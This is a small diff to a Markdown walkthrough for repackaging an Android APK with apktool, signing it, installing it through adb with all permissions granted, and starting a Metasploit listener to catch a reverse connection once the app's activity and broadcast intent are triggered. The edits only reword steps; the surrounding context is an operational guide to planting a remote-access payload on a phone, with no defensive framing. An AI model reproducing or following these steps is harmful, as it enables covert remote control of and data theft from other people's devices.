@@ -47,7 +47,7 @@ apktool b unpacked_folder -o example_usb.apk
 
 ## Step 3: Cryptographic Signing
 
-Android environments reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.
+Android environments sometimes reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.
 
 ```bash
 # Generate a development keystore
@@ -79,7 +79,7 @@ adb install --user 0 -r -d -g signed_usb.apk
 
 ## Step 5: Session Handling & Execution
 
-Initialize the Metasploit framework locally to listen for the incoming reverse connection.
+In a seperate terminal, start the Metasploit framework locally to listen for the incoming reverse connection.
 
 ```bash
 msfconsole
@@ -94,7 +94,7 @@ set LPORT 4444
 set IgnorePayloadUUIDs true
 exploit
 ```
-Force the device interface activity layer into the foreground, then trigger the underlying execution broadcast intent to catch the core session:
+Open new terminal, then force the device interface activity layer into the foreground, then trigger the underlying execution broadcast intent to catch the core session:
 
 ```bash
 # Force-start the main activity
